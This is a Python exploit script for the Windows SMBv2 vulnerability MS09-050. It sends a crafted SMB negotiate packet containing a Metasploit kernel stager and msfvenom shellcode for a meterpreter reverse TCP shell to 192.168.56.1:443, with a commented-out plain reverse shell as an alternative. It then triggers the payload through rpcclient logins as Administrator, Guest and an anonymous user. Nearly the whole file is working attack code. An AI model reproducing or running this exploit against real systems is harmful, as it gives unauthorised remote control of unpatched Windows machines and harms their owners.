#!/usr/bin/python
# This module depends on the linux command line program smbclient.
# I can't find a python smb library for smb login. If you can find one, you can replace that part of the code with the smb login function in python.
# The idea is that after the evil payload is injected by the first packet, it need to be trigger by an authentication event. Whether the authentication successes or not does not matter.

import tempfile
import sys
import subprocess
from socket import socket
from time import sleep
from smb.SMBConnection import SMBConnection


try:
	target = sys.argv[1]
except IndexError:
	print '\nUsage: %s <target ip>\n' % sys.argv[0]
	print 'Example: ms09-050.py 192.168.1.1\n'
	sys.exit(-1)

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=443 EXITFUNC=thread -f python
# 354 bytes long

buf =  ""
buf += "\x31\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x9c\xe6\xa8\x99\x83\xee\xfc\xe2\xf4\x60\x0e"
buf += "\x2a\x99\x9c\xe6\xc8\x10\x79\xd7\x68\xfd\x17\xb6\x98"
buf += "\x12\xce\xea\x23\xcb\x88\x6d\xda\xb1\x93\x51\xe2\xbf"
buf += "\xad\x19\x04\xa5\xfd\x9a\xaa\xb5\xbc\x27\x67\x94\x9d"
buf += "\x21\x4a\x6b\xce\xb1\x23\xcb\x8c\x6d\xe2\xa5\x17\xaa"
buf += "\xb9\xe1\x7f\xae\xa9\x48\xcd\x6d\xf1\xb9\x9d\x35\x23"
buf += "\xd0\x84\x05\x92\xd0\x17\xd2\x23\x98\x4a\xd7\x57\x35"
buf += "\x5d\x29\xa5\x98\x5b\xde\x48\xec\x6a\xe5\xd5\x61\xa7"
buf += "\x9b\x8c\xec\x78\xbe\x23\xc1\xb8\xe7\x7b\xff\x17\xea"
buf += "\xe3\x12\xc4\xfa\xa9\x4a\x17\xe2\x23\x98\x4c\x6f\xec"
buf += "\xbd\xb8\xbd\xf3\xf8\xc5\xbc\xf9\x66\x7c\xb9\xf7\xc3"
buf += "\x17\xf4\x43\x14\xc1\x8e\x9b\xab\x9c\xe6\xc0\xee\xef"
buf += "\xd4\xf7\xcd\xf4\xaa\xdf\xbf\x9b\x19\x7d\x21\x0c\xe7"
buf += "\xa8\x99\xb5\x22\xfc\xc9\xf4\xcf\x28\xf2\x9c\x19\x7d"
buf += "\xf3\x94\xbf\xf8\x7b\x61\xa6\xf8\xd9\xcc\x8e\x42\x96"
buf += "\x43\x06\x57\x4c\x0b\x8e\xaa\x99\x9c\x6f\x21\x7f\xf6"
buf += "\xf6\xfe\xce\xf4\x24\x73\xae\xfb\x19\x7d\xce\xf4\x51"
buf += "\x41\xa1\x63\x19\x7d\xce\xf4\x92\x44\xa2\x7d\x19\x7d"
buf += "\xce\x0b\x8e\xdd\xf7\xd1\x87\x57\x4c\xf4\x85\xc5\xfd"
buf += "\x9c\x6f\x4b\xce\xcb\xb1\x99\x6f\xf6\xf4\xf1\xcf\x7e"
buf += "\x1b\xce\x5e\xd8\xc2\x94\x98\x9d\x6b\xec\xbd\x8c\x20"
buf += "\xa8\xdd\xc8\xb6\xfe\xcf\xca\xa0\xfe\xd7\xca\xb0\xfb"
buf += "\xcf\xf4\x9f\x64\xa6\x1a\x19\x7d\x10\x7c\xa8\xfe\xdf"
buf += "\x63\xd6\xc0\x91\x1b\xfb\xc8\x66\x49\x5d\x48\x84\xb6"
buf += "\xec\xc0\x3f\x09\x5b\x35\x66\x49\xda\xae\xe5\x96\x66"
buf += "\x53\x79\xe9\xe3\x13\xde\x8f\x94\xc7\xf3\x9c\xb5\x57"
buf += "\x4c"


while len(buf) < 354:
	buf += "\x90"


# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=443 EXITFUNC=thread -f python
# 324 bytes long
# Added 30 NOPS

# buf =  ""
# buf += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
# buf += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
# buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
# buf += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
# buf += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
# buf += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
# buf += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
# buf += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
# buf += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
# buf += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
# buf += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
# buf += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
# buf += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
# buf += "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
# buf += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
# buf += "\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
# buf += "\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0b\x00\x0b\x68"
# buf += "\x02\x00\x11\x5f\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
# buf += "\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
# buf += "\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
# buf += "\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
# buf += "\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
# buf += "\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
# buf += "\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
# buf += "\x68\x08\x87\x1d\x60\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68"
# buf += "\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
# buf += "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

host = target, 445

buff ="\x00\x00\x03\x9e\xff\x53\x4d\x42"
buff+="\x72\x00\x00\x00\x00\x18\x53\xc8"
buff+="\x17\x02" #high process ID
buff+="\x00\xe9\x58\x01\x00\x00"
buff+="\x00\x00\x00\x00\x00\x00\x00\x00"
buff+="\x00\x00\xfe\xda\x00\x7b\x03\x02"
buff+="\x04\x0d\xdf\xff"*25
buff+="\x00\x02\x53\x4d"
buff+="\x42\x20\x32\x2e\x30\x30\x32\x00"
buff+="\x00\x00\x00\x00"*37
buff+="\xff\xff\xff\xff"*2
buff+="\x42\x42\x42\x42"*7
buff+="\xb4\xff\xff\x3f" #magic index
buff+="\x41\x41\x41\x41"*6
buff+="\x09\x0d\xd0\xff" #return address

#stager_sysenter_hook from metasploit

buff+="\xfc\xfa\xeb\x1e\x5e\x68\x76\x01"
buff+="\x00\x00\x59\x0f\x32\x89\x46\x5d"
buff+="\x8b\x7e\x61\x89\xf8\x0f\x30\xb9"
buff+="\x16\x02\x00\x00\xf3\xa4\xfb\xf4"
buff+="\xeb\xfd\xe8\xdd\xff\xff\xff\x6a"
buff+="\x00\x9c\x60\xe8\x00\x00\x00\x00"
buff+="\x58\x8b\x58\x54\x89\x5c\x24\x24"
buff+="\x81\xf9\xde\xc0\xad\xde\x75\x10"
buff+="\x68\x76\x01\x00\x00\x59\x89\xd8"
buff+="\x31\xd2\x0f\x30\x31\xc0\xeb\x31"
buff+="\x8b\x32\x0f\xb6\x1e\x66\x81\xfb"
buff+="\xc3\x00\x75\x25\x8b\x58\x5c\x8d"
buff+="\x5b\x69\x89\x1a\xb8\x01\x00\x00"
buff+="\x80\x0f\xa2\x81\xe2\x00\x00\x10"
buff+="\x00\x74\x0e\xba\x00\xff\x3f\xc0"
buff+="\x83\xc2\x04\x81\x22\xff\xff\xff"
buff+="\x7f\x61\x9d\xc3\xff\xff\xff\xff"
buff+="\x00\x04\xdf\xff\x00\x04\xfe\x7f"
buff+="\x60\x6a\x30\x58\x99\x64\x8b\x18"
buff+="\x39\x53\x0c\x74\x2b\x8b\x43\x10"
buff+="\x8b\x40\x3c\x83\xc0\x28\x8b\x08"
buff+="\x03\x48\x03\x81\xf9\x6c\x61\x73"
buff+="\x73\x75\x15\xe8\x07\x00\x00\x00"
buff+="\xe8\x0d\x00\x00\x00\xeb\x09\xb9"
buff+="\xde\xc0\xad\xde\x89\xe2\x0f\x34"
buff+="\x61\xc3\x81\xc4\x54\xf2\xff\xff"

#Change this to match your shell
buff+=buf

s = socket()
s.connect(host)
s.send(buff)
s.close()
# Trigger the above injected code via authenticated process.
try:
	subprocess.call("echo '1223456' | rpcclient -U Administrator %s"%(target), shell=True)
except Exception as e:
	print str(e)

try:
	subprocess.call("echo '1223456' | rpcclient -U Guest %s"%(target), shell=True)
except Exception as e:
	print str(e)

try:
	subprocess.call("echo '1223456' | rpcclient -U '' %s"%(target), shell=True)
except Exception as e:
	print str(e)

print "Done."